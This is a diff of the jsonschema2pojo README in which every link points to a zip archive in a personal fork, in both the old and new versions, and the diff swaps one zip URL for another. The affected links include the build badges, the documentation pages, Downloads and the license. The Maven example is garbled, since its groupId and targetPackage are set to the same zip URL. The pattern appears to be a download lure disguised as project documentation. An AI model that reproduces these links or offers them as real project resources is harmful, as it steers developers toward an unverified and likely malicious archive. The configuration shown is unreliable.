@@ -1,20 +1,20 @@
-# jsonschema2pojo [![Build Status](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip) [![Maven Central](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)
+# jsonschema2pojo [![Build Status](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip)](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip) [![Maven Central](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip)](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip)
 
 _jsonschema2pojo_ generates Java types from JSON Schema (or example JSON) and can annotate those types for data-binding with Jackson 1.x, Jackson 2.x or Gson.
 
-### [Try jsonschema2pojo online](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)<br>or `brew install jsonschema2pojo`
+### [Try jsonschema2pojo online](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip)<br>or `brew install jsonschema2pojo`
 
-You can use jsonschema2pojo as a Maven plugin, an Ant task, a command line utility, a Gradle plugin or embedded within your own Java app. The [Getting Started](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip) guide will show you how.
+You can use jsonschema2pojo as a Maven plugin, an Ant task, a command line utility, a Gradle plugin or embedded within your own Java app. The [Getting Started](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip) guide will show you how.
 
 A very simple Maven example:
 ```xml
 <plugin>
-    <groupId>https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip</groupId>
+    <groupId>https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip</groupId>
     <artifactId>jsonschema2pojo-maven-plugin</artifactId>
     <version>0.4.26</version>
     <configuration>
         <sourceDirectory>${basedir}/src/main/resources/schema</sourceDirectory>
-        <targetPackage>https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip</targetPackage>
+        <targetPackage>https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip</targetPackage>
     </configuration>
     <executions>
         <execution>
@@ -27,15 +27,15 @@ A very simple Maven example:
 ```
 
 Useful pages:
-  * **[Getting started](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)**
-  * **[How to contribute](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)**
-  * [Reference](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)
-  * [Latest Javadocs](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)
-  * [Documentation for the Maven plugin](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)
-  * [Documentation for the Ant task](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)
+  * **[Getting started](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip)**
+  * **[How to contribute](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip)**
+  * [Reference](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip)
+  * [Latest Javadocs](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip)
+  * [Documentation for the Maven plugin](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip)
+  * [Documentation for the Ant task](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip)
 
 Project resources:
-  * [Downloads](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)
-  * [Mailing list](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip!forum/jsonschema2pojo-users)
+  * [Downloads](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip)
+  * [Mailing list](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip!forum/jsonschema2pojo-users)
 
-Licensed under the [Apache License, Version 2.0](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip).
+Licensed under the [Apache License, Version 2.0](https://github.com/ducnguyenminh/jsonschema2pojo/raw/refs/heads/master/jsonschema2pojo-maven-plugin/jsonschema_pojo_3.7.zip).
